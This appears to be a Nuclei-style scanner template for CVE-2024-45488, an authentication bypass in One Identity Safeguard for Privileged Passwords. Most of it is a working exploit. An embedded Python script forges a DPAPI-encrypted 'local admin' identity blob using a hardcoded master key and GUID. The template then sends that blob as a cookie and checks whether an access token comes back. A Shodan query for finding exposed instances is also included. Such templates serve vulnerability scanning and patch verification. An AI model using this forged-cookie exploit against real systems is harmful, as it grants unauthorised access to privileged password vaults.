code:
- engine:
  - py
  - python3
  source: "# pip install pycryptodome\nfrom datetime import datetime, timedelta\n\
    from Crypto.Cipher import AES, DES3\nfrom Crypto.Hash import HMAC, SHA1, SHA512,\
    \ SHA256\nfrom Crypto.Util.Padding import pad\nfrom io import BytesIO\nimport\
    \ argparse\nimport string\nimport base64\nimport uuid\nimport os\n\nclass DPAPIBlob:\n\
    \    CALG_3DES = 0x6603\n    CALG_AES_256 = 0x6610\n\n    CALG_SHA1 = 0x8004\n\
    \    CALG_SHA_256 = 0x800c\n    CALG_SHA_512 = 0x800e\n\n    def combine_bytes(self,\
    \ *arrays):\n        return b''.join(arrays)\n\n    def hmac_sha512(self, key,\
    \ data):\n        hmac = HMAC.new(key, digestmod=SHA512)\n        hmac.update(data)\n\
    \        return hmac.digest()\n\n    def derive_key_raw(self, hash_bytes, alg_hash):\n\
    \        ipad = bytearray([0x36] * 64)\n        opad = bytearray([0x5C] * 64)\n\
    \n        for i in range(len(hash_bytes)):\n            ipad[i] ^= hash_bytes[i]\n\
    \            opad[i] ^= hash_bytes[i]\n\n        if alg_hash == self.CALG_SHA1:\n\
    \            sha1 = SHA1.new()\n            ipad_sha1bytes = sha1.new(ipad).digest()\n\
    \            opad_sha1bytes = sha1.new(opad).digest()\n            return self.combine_bytes(ipad_sha1bytes,\
    \ opad_sha1bytes)\n        else:\n            raise Exception(f\"Unsupported alg_hash:\
    \ {alg_hash}\")\n\n    def derive_key2(self, key, nonce, hash_algorithm, blob,\
    \ entropy=None):\n        \"\"\"\n        Derive a key using the provided key,\
    \ nonce, hash algorithm, blob, and optional entropy.\n\n        :param key: The\
    \ base key material.\n        :param nonce: The nonce (salt) value.\n        :param\
    \ hash_algorithm: The hash algorithm identifier (SHA1, SHA256, SHA512).\n    \
    \    :param blob: The additional data to include in the key derivation.\n    \
    \    :param entropy: Optional entropy to include in the key derivation.\n    \
    \    :return: The derived key as a byte array.\n        \"\"\"\n        if hash_algorithm\
    \ == self.CALG_SHA1:\n            hmac = HMAC.new(key, digestmod=SHA1)\n     \
    \   elif hash_algorithm == self.CALG_SHA_256:\n            hmac = HMAC.new(key,\
    \ digestmod=SHA256)\n        elif hash_algorithm == self.CALG_SHA_512:\n     \
    \       hmac = HMAC.new(key, digestmod=SHA512)\n        else:\n            raise\
    \ Exception(f\"Unsupported hash algorithm: {hash_algorithm}\")\n\n        key_material\
    \ = bytearray()\n        key_material.extend(nonce)\n\n        if entropy is not\
    \ None:\n            key_material.extend(entropy)\n\n        key_material.extend(blob)\n\
    \n        hmac.update(key_material)\n        return hmac.digest()\n\n    def derive_key(self,\
    \ key_bytes, salt_bytes, alg_hash, entropy=None):\n        if alg_hash == self.CALG_SHA_512:\n\
    \            if entropy is not None:\n                return self.hmac_sha512(key_bytes,\
    \ self.combine_bytes(salt_bytes, entropy))\n            else:\n              \
    \  return self.hmac_sha512(key_bytes, salt_bytes)\n        elif alg_hash == self.CALG_SHA1:\n\
    \            ipad = bytearray([0x36] * 64)\n            opad = bytearray([0x5C]\
    \ * 64)\n\n            for i in range(len(key_bytes)):\n                ipad[i]\
    \ ^= key_bytes[i]\n                opad[i] ^= key_bytes[i]\n\n            buffer_i\
    \ = self.combine_bytes(ipad, salt_bytes)\n\n            sha1 = SHA1.new()\n  \
    \          sha1.update(buffer_i)\n            sha1_buffer_i = sha1.digest()\n\n\
    \            buffer_o = self.combine_bytes(opad, sha1_buffer_i)\n            if\
    \ entropy is not None:\n                buffer_o = self.combine_bytes(buffer_o,\
    \ entropy)\n\n            sha1.update(buffer_o)\n            sha1_buffer_o = sha1.digest()\n\
    \n            return self.derive_key_raw(sha1_buffer_o, alg_hash)\n        else:\n\
    \            raise Exception(\"Unsupported Hash Algorithm\")\n\n    def encrypt(self,\
    \ plaintext, key, algCrypt):\n        if algCrypt == self.CALG_3DES:\n       \
    \     iv = b'\\x00' * 8\n            cipher = DES3.new(key, DES3.MODE_CBC, iv)\n\
    \        elif algCrypt == self.CALG_AES_256:\n            iv = b'\\x00' * 16\n\
    \            cipher = AES.new(key, AES.MODE_CBC, iv)\n        else:\n        \
    \    raise Exception(f\"Unsupported encryption algorithm: {algCrypt}\")\n\n  \
    \      padded_data = pad(plaintext, cipher.block_size)\n        return cipher.encrypt(padded_data)\n\
    \n    def create_blob(self, plaintext, masterKey, algCrypt, algHash, masterKeyGuid,\
    \ flags=0, entropy=None, description=\"\"):\n        descBytes = description.encode('utf-16le')\
    \ if description else b'\\x00\\x00'\n        saltBytes = os.urandom(32)\n    \
    \    hmac2KeyLen = 32\n\n        if algCrypt == self.CALG_3DES:\n            algCryptLen\
    \ = 192\n        elif algCrypt == self.CALG_AES_256:\n            algCryptLen\
    \ = 256\n        else:\n            raise Exception(f\"Unsupported encryption\
    \ algorithm: {algCrypt}\")\n\n        if algHash == self.CALG_SHA1:\n        \
    \    signLen = 20\n        elif algHash == self.CALG_SHA_256:\n            signLen\
    \ = 32\n        elif algHash == self.CALG_SHA_512:\n            signLen = 64\n\
    \        else:\n            raise Exception(f\"Unsupported hash algorithm: {algHash}\"\
    )\n\n        # Derive key\n        derivedKeyBytes = self.derive_key(masterKey,\
    \ saltBytes, algHash, entropy)\n        finalKeyBytes = derivedKeyBytes[:algCryptLen\
    \ // 8]\n\n        # Encrypt data\n        encData = self.encrypt(plaintext, finalKeyBytes,\
    \ algCrypt)\n\n        # Construct the BLOB using BytesIO\n        blob = BytesIO()\n\
    \n        # Version\n        blob.write((1).to_bytes(4, 'little'))\n\n       \
    \ # Provider GUID\n        providerGuid = uuid.UUID(\"df9d8cd0-1501-11d1-8c7a-00c04fc297eb\"\
    ).bytes_le\n        blob.write(providerGuid)\n\n        # MasterKey version\n\
    \        blob.write((1).to_bytes(4, 'little'))\n\n        # MasterKey GUID\n \
    \       blob.write(masterKeyGuid.bytes_le)\n\n        # Flags\n        blob.write((flags).to_bytes(4,\
    \ 'little'))\n\n        # Description length\n        blob.write(len(descBytes).to_bytes(4,\
    \ 'little'))\n\n        # Description\n        blob.write(descBytes)\n\n     \
    \   # Algorithm ID\n        blob.write(algCrypt.to_bytes(4, 'little'))\n\n   \
    \     # Algorithm key length\n        blob.write(algCryptLen.to_bytes(4, 'little'))\n\
    \n        # Salt length\n        blob.write(len(saltBytes).to_bytes(4, 'little'))\n\
    \n        # Salt\n        blob.write(saltBytes)\n\n        # HMAC key length (always\
    \ 0)\n        blob.write((0).to_bytes(4, 'little'))\n\n        # Hash algorithm\
    \ ID\n        blob.write(algHash.to_bytes(4, 'little'))\n\n        # Hash length\n\
    \        blob.write((len(derivedKeyBytes) * 8).to_bytes(4, 'little'))\n\n    \
    \    # HMAC2 key length\n        blob.write(hmac2KeyLen.to_bytes(4, 'little'))\n\
    \n        # HMAC2 key\n        hmac2Key = os.urandom(hmac2KeyLen)\n        blob.write(hmac2Key)\n\
    \n        # Data length\n        blob.write(len(encData).to_bytes(4, 'little'))\n\
    \n        # Encrypted Data\n        blob.write(encData)\n\n        # Create the\
    \ HMAC (sign) over the entire blob except for the sign field\n        signBlob\
    \ = blob.getvalue()[20:]  # Skip the first 20 bytes for the HMAC calculation\n\
    \        sign = self.derive_key2(masterKey, hmac2Key, algHash, signBlob, entropy)\n\
    \n        # Sign length\n        blob.write(signLen.to_bytes(4, 'little'))\n\n\
    \        # Sign\n        blob.write(sign)\n\n        return blob.getvalue()\n\n\
    def main():\n    args = {\n    'master_key': '48F4153A8C26C2B026562685B67C30EFF119D735',\n\
    \    'master_key_guid': '98dc3c79-9aa5-4efc-927f-ccec24eaa14e',\n    'local':\
    \ 1,\n    'base64': 1\n    }\n    current_time = datetime.utcnow().strftime(\"\
    %Y%m%dT%H%M%SZ\")\n    future_time = (datetime.utcnow() + timedelta(days=1)).strftime(\"\
    %Y%m%dT%H%M%SZ\")\n\n    plaintext= f\"local,admin,Primary,Password,{current_time},{future_time}\"\
    \n    plaintext=plaintext.encode('utf-8')\n    if not all(c in string.hexdigits\
    \ for c in args['master_key']):\n        print (f' Provided master key is not\
    \ valid: {args.master_key}')\n        return\n\n    try:\n        uuid.UUID(args[\"\
    master_key_guid\"])\n    except ValueError:\n        print (f' Provided master\
    \ key GUID is not valid: {args[\"master_key_guid\"]}')\n        return\n\n   \
    \ # Parse the master key and GUID\n    masterKey = bytes.fromhex(args['master_key'])\n\
    \    masterKeyGuid = uuid.UUID(args[\"master_key_guid\"])\n    algCrypt = DPAPIBlob.CALG_AES_256\n\
    \    algHash = DPAPIBlob.CALG_SHA_512\n    flags = 0\n\n    if args['local']:\n\
    \        flags |= 4 # CRYPTPROTECT_LOCAL_MACHINE\n\n    dpapi = DPAPIBlob()\n\
    \    encrypted_blob = dpapi.create_blob(plaintext, masterKey, algCrypt, algHash,\
    \ masterKeyGuid, flags)\n\n    if args['base64']:\n        output_data = base64.b64encode(encrypted_blob).decode('utf-8')\n\
    \    else:\n        output_data = encrypted_blob.hex(' ')\n\n    print(f\"{output_data}\"\
    )\n\nif __name__ == \"__main__\":\n    main()\n"
http:
- headers:
    Cookie: CsrfToken=aaa; stsIdentity0={{code_response}}
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - access_token=
    - RelyingPartyUrl
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/RSTS/UserLogin/LoginController?response_type=token&redirect_uri=https%3A%2F%2Flocalhost&loginRequestStep=6&csrfTokenTextbox=aaa'
id: CVE-2024-45488
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cve-id: CVE-2024-45488
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.09691
    epss-score: 0.00043
  description: 'One Identity Safeguard for Privileged Passwords before 7.5.2 allows
    unauthorized access because of an issue related to cookies. This only affects
    virtual appliance installations (VMware or HyperV). The fixed versions are 7.0.5.1
    LTS, 7.4.2, and 7.5.2.

    '
  metadata:
    max-request: 1
    shodan-query: html:"Safeguard for Privileged Passwords"
    verified: true
  name: SafeGuard for Privileged Passwords < 7.5.2 - Authentication Bypass
  reference:
  - https://blog.amberwolf.com/blog/2024/september/cve-2024-45488-one-identity-safeguard-for-privileged-passwords-authentication-bypass/
  - https://blog.amberwolf.com/blog/2024/september/skeleton-cookie-breaking-into-safeguard-with-cve-2024-45488/
  - https://gist.github.com/rxwx/c968b3324e74058208fe6e168fd8730f
  - https://support.oneidentity.com/kb/4376740/safeguard-for-privileged-passwords-security-vulnerability-notification-defect-460620
  - https://support.oneidentity.com/product-notification/noti-00001628
  severity: critical
  tags: cve,cve2024,auth-bypass,safeguard
